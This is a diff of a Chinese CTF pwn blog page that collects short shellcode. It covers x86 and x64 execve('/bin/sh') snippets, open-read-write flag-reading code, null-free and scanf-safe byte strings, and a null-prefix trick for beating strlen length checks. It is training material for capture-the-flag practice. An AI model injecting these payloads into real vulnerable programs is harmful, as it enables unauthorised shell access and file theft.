-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># (execve(&quot;/bin/sh&quot;,NULL,NULL))</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68732f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># (execve(&quot;/bin/sh&quot;,NULL,NULL))</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x68732f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 11</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p><code>orw</code> - 56字节</p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /*open(./flag)*/</span></span><br><span class="line"><span class="string">    push 0x1010101</span></span><br><span class="line"><span class="string">    xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">    push 0x6c662f2e</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x30</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /*open(./flag)*/</span></span><br><span class="line"><span class="string">    push 0x1010101</span></span><br><span class="line"><span class="string">    xor dword ptr [esp], 0x1016660</span></span><br><span class="line"><span class="string">    push 0x6c662f2e</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*read(fd,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,eax</span></span><br><span class="line"><span class="string">    mov ecx,esp</span></span><br><span class="line"><span class="string">    mov edx,0x30</span></span><br><span class="line"><span class="string">    mov eax,0x3</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    /*write(1,buf,0x100)*/</span></span><br><span class="line"><span class="string">    mov ebx,0x1</span></span><br><span class="line"><span class="string">    mov eax,0x4</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>无<code>\x00</code>截断<code>getshell</code> - 21字节</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br></pre></td></tr></table></figure>
 
 <p><code>scanf</code>可读取<code>getshell</code> - 41字节</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>利用短字节shellcode(64位)</strong></p>
 <p><code>getshell</code> - 22字节</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p><code>orw</code> - 43字节</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    push 2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
 
 <p>无<code>\x00</code>截断、<code>scanf</code>可读 - 22字节</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>\x00截断绕过长度判断</strong></p>
 <p>当题目采用<code>strlen</code>来进行<code>shellcode</code>的长度检测时，可以在其前面加<code>\x00</code>开头的指令绕过长度检测。以下为64位的指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 40 00                 add    BYTE PTR [rax+0x0],  al</span><br><span class="line">00 41 00                 add    BYTE PTR [rcx+0x0],  al</span><br><span class="line">00 42 00                 add    BYTE PTR [rdx+0x0],  al</span><br><span class="line">00 43 00                 add    BYTE PTR [rbx+0x0],  al</span><br><span class="line">00 45 00                 add    BYTE PTR [rbp+0x0],  al</span><br><span class="line">00 46 00                 add    BYTE PTR [rsi+0x0],  al</span><br><span class="line">00 47 00                 add    BYTE PTR [rdi+0x0],  al</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00 40 00                 add    BYTE PTR [rax+0x0],  al</span><br><span class="line">00 41 00                 add    BYTE PTR [rcx+0x0],  al</span><br><span class="line">00 42 00                 add    BYTE PTR [rdx+0x0],  al</span><br><span class="line">00 43 00                 add    BYTE PTR [rbx+0x0],  al</span><br><span class="line">00 45 00                 add    BYTE PTR [rbp+0x0],  al</span><br><span class="line">00 46 00                 add    BYTE PTR [rsi+0x0],  al</span><br><span class="line">00 47 00                 add    BYTE PTR [rdi+0x0],  al</span><br></pre></td></tr></table></figure>
 
 <p>ps:也可直接<code>\x00\x00</code>绕过</p>
 </li>
@@ -307,146 +212,184 @@
 <h4 id="二-限制权限"><a href="#二-限制权限" class="headerlink" title="二.限制权限"></a>二.限制权限</h4><ol>
 <li><p><strong>限制shellcode无读写权限</strong></p>
 <p>利用<code>mprotect</code>给予读写权限，并再次利用<code>read</code>写入执行</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">mprotect用法</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mprotect用法</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mmap.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>限制远程读flag权限</strong></p>
 <p>先执行<code>setuid(0)</code>，再执行<code>execve</code>来进行<code>getshell</code>。</p>
 </li>
 </ol>
 <!--more-->
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+		 <span  data-path="" >
+			<em class="post-meta-item-text"> Page View   <i class="waline-pageview-count"></i></em>
+		</span>
+
+	  
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2025/11/07/Re练习之ASM汇编逆向/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/11/01/ilovectf week4 部分WP/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
 </div>
 
 
-  <footer class="post-footer">
-  
-    <div class="post-categories">
-      <span class="meta-label">分类: </span>
-      
-        <a href="../../../../categories/CTF%E7%9B%B8%E5%85%B3/" class="category">CTF相关</a>
-      
-    </div>
-  
-  
-    <div class="post-tags">
-      <span class="meta-label">标签: </span>
-      
-        <a href="../../../../tags/CTF%E7%9F%A5%E8%AF%86%E5%88%86%E4%BA%AB/" class="tag">CTF知识分享</a>
-      
-        <a href="../../../../tags/%E6%97%A5%E5%B8%B8%E7%BB%83%E4%B9%A0/" class="tag">日常练习</a>
-      
-        <a href="../../../../tags/pwn/" class="tag">pwn</a>
-      
-    </div>
-  
-</footer>
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+		<section id="comments" class="comments">
+			<link
+    rel="stylesheet"
+    href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+  />
+  <div id="waline"></div>
+  <script type="module">
+    import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+    var walineConfig = {"enable":true,"serverURL":"https://waline-pi-blue-88.vercel.app/","pageview":true,"lang":"en","dark":true,"requiredMeta":["nick","mail"],"locale":{"placeholder":"Comment with Email address will get notification when replied"}}
+    walineConfig.el='#waline';
+    init(walineConfig);
+  </script>
+
+		</section>
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
 
 
-  
-<nav class="post-nav">
-  
-    <div class="post-nav-item prev">
-      <span class="post-nav-label">&larr; Prev</span>
-      <a href="../../07/Re%E7%BB%83%E4%B9%A0%E4%B9%8BASM%E6%B1%87%E7%BC%96%E9%80%86%E5%90%91/" class="post-nav-title">
-        Re练习之ASM汇编逆向
-      </a>
-    </div>
-  
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
 
-  
-    <div class="post-nav-item next">
-      <span class="post-nav-label">Next &rarr;</span>
-      <a href="../../01/ilovectf%20week4%20%E9%83%A8%E5%88%86WP/" class="post-nav-title">
-        ?CTF2025 week4部分WP
-      </a>
-    </div>
-  
-</nav>
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-11-05 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/CTF相关/">CTF相关<span>18</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF知识分享/">CTF知识分享<span>9</span></a></li> <li><a href="/tags/pwn/">pwn<span>1</span></a></li> <li><a href="/tags/日常练习/">日常练习<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
 
 
 
-  
-</article>
-
-        </div>
-      
-    </main>
-
-    <footer class="footer">
-  <div class="footer-content">
-    <div class="footer-left">
-      
-      <span class="copyright">
-        &copy; 2024 - 2026 debu8ger
-      </span>
-    </div>
-
-    <div class="footer-right">
-      
-        <span class="powered">
-          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
-        </span>
-      
-      
-        <span class="theme-info">
-          Theme <a href="https://github.com/WinMin/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
-        </span>
-      
-    </div>
+	</div>
   </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 debu8ger's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
 
   
-    <div class="footer-social">
-      
-        <a href="https://github.com/incldue" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
-          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
-        </a>
-      
-      
-        <a href="https://x.com/JonathanHu70782" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
-          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
-        </a>
-      
-      
-      
-        <a href="mailto:52463398@outlook.com" class="social-link" aria-label="Email">
-          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
-        </a>
-      
-      
-        <a href="../../../../atom.xml" class="social-link" aria-label="RSS">
-          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
-        </a>
-      
-    </div>
-  
-</footer>
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
 
-  </div>
-
-  <!-- Main Script -->
-
-<script src="../../../../js/main.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
 
 
-<!-- Search -->
-
-
-<script src="../../../../js/search.js"></script>
-
-
-
-<!-- Baidu Analytics -->
-
-<script>
-var _hmt = _hmt || [];
-(function() {
-  var hm = document.createElement("script");
-  hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(hm, s);
-})();
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
 </script>
 
 
+
+   <script type="text/javascript">      
+     var search_path = "search.json";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
 </body>
-</html>
+   </html>
